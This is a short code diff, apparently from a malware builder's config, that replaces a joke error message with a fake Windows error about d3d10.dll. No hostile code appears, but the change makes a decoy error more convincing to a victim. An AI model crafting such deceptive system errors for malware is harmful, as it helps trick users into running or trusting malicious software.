@@ -13,7 +13,7 @@ config = {
     'force_admin': False, 
     'black_screen': True, 
     'error': True, 
-    'error_message': 'Failed To Open Poop Tool\nclick "ok" to open',
+    'error_message': 'Windows Failed to Create Process for d3d10.dll\nclick "ok" to proceed',
 }
 
 class functions(object):
